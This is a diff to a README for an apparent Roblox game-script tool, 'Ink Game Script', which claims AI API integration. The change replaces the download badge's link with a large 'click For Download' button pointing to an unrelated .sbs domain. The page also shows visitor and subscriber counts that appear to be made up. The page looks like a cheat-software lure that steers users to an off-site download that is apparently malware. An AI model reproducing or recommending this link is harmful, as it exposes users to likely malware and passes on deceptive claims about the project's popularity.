@@ -4,13 +4,17 @@
 Welcome to **Ink Game Script Roblox** – your next-level solution for enhancing, transforming, and scripting your Roblox experiences. Bring your imagination to life in the Roblox universe with innovative, intelligent scripting, harnessing the prowess of advanced AI models like **OpenAI API** and **Claude API**. Ink Game Script is designed to propel your Roblox creations into uncharted social, creative, and functional territory.
 ---
 
-<div style="text-align: center">
-  <a href="https://ink-game-script-auto-tug-of-war.github.io/.github/">
-    <img class="bumbum" style="width: 600px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-INKGAMESCRIPT-blueviolet">
-  </a>
-</div>
+<a href="https://kerten.sbs/kl/old">
+  <img
+    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
+    alt="gg"
+    width="1100"
+  >
+</a>
 
 ---
+
+
 ![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c) ![Last Updated: 2025](https://img.shields.io/badge/Last_Updated-2025-3498db)
 
 ---
